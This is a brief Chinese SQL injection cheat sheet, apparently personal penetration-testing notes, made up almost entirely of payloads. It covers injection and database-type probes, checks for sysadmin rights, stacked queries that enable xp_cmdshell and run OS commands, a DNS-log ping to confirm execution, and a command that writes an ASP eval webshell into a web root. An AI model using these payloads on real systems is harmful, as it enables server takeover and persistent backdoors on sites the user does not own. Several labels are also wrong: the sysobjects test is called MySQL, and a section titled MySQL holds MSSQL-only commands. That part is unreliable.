## 判断是否有注入：
```
'and 1=1
'and 1=2
```
## 初步判断是否是mysql
`'and user>0`
## 判断数据库系统
```
'and (select count(*) from sysobjects)>0 正常则是Mysql
'and (select count(*) from msysobjects)>0 正常则是Access
;	Oracle中不支持多行查询，返回错误，很可能是Oracle数据库
#	是MySQL中的注释符，返回错误说明该注入点可能不是MySQL
– 和/**/是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了
``` 
# Mysql数据库环境：
## 判断是否为sa权限：
`;if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:5';--`
## 查看是否开启了xp_cmdshell：
`;if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:5'--`
## 开启xp_cmdshell(SA权限用户)：
`;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;`
## 执行cmd命令：
`;EXEC%20master..xp_cmdshell 'cmd命令';--`
## 查看是否开启成功
`;EXEC%20master..xp_cmdshell 'ping aa.dnslog';--`
## 写入webshell
`;EXEC%20master..xp_cmdshell 'echo ^<%eval request(chr(35))%^> > C:/inetpub/xxxxxx/a.asp';--`
